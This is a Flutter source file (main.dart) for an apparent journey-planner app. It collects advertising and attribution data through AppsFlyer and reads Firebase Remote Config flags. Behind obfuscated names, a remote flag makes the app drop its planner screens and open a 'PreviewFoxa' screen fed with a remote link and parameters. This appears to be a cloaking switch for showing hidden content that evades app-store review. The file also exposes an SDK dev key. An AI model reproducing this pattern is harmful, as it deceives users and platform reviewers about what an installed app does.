import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:jorney_map/util/app_routes.dart';
import 'package:jorney_map/views/homescreen/widgets/firebase_options.dart';
import 'package:jorney_map/views/settings/views/settings_screen.dart';
import 'data/repository/onboarding_repository.dart';
import 'views/homescreen/widgets/xsa.dart';

late AppsflyerSdk _appsflyerSdk;
String adId = '';
bool stat = false;
String acceptPromo = '';
String cancelPromo = '';
String datioq = '';
String appsflyerId = '';
String advertisingId = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _campaign = '';
String _campaignId = '';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await Notifas().activate();
  await tewdew();
  bool isFirstTime = await OnboardingRepository().checkFirstTime();
  runApp(MyApp(isFirstLaunch: isFirstTime));
}

Future<void> tewdew() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

Future<String> getAdv() async {
  String adv = await AppTrackingTransparency.getAdvertisingIdentifier();
  advertisingId = adv;
  return adv;
}

Future<void> afSbin() async {
  await getAdv();
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'XFtWP6JvpRRFdnypp4woCV',
    appId: '6503623211',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    cancelPromo = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });

  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    acceptPromo = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    _deepLinkData = dp.toJson();
  });
  _appsflyerSdk.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

String dx = '';
String df = '';
String dataz = '';
Future<bool> checkdas() async {
  final gazel = FirebaseRemoteConfig.instance;
  await gazel.fetchAndActivate();
  String dsdfdsfgdg = gazel.getString('planner');
  String dsdfdsfgdg1 = gazel.getString('info');
  String dsdfdsfgdg2 = gazel.getString('plannerx');
  String dsdfdsfgdg3 = gazel.getString('data');
  dx = dsdfdsfgdg1;
  df = dsdfdsfgdg2;
  dataz = dsdfdsfgdg3;
  datioq = dsdfdsfgdg;
  await afSbin();
  return dsdfdsfgdg.contains('none') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key, required this.isFirstLaunch});

  final bool isFirstLaunch;

  @override
  Widget build(BuildContext context) {
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
    ]);
    return FutureBuilder<bool>(
      future: checkdas(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return Container(
            color: Colors.white,
            child: Center(
              child: Container(
                height: 140,
                width: 140,
                child: ClipRRect(
                  borderRadius: BorderRadius.circular(15),
                  child: Image.asset('assets/images/onboarding.png'),
                ),
              ),
            ),
          );
        } else {
          if (snapshot.data == true && datioq != '') {
            return MaterialApp(
              debugShowCheckedModeBanner: false,
              home: PreviewFoxa(
                params: dx,
                lnk: df,
                data: dataz,
              ),
            );
          } else {
            return MaterialApp(
              debugShowCheckedModeBanner: false,
              theme: ThemeData(primarySwatch: Colors.green),
              onGenerateRoute: AppRoutes.onGenerateRoute,
              initialRoute: isFirstLaunch ? AppRoutes.welcome : AppRoutes.home,
            );
          }
        }
      },
    );
  }
}
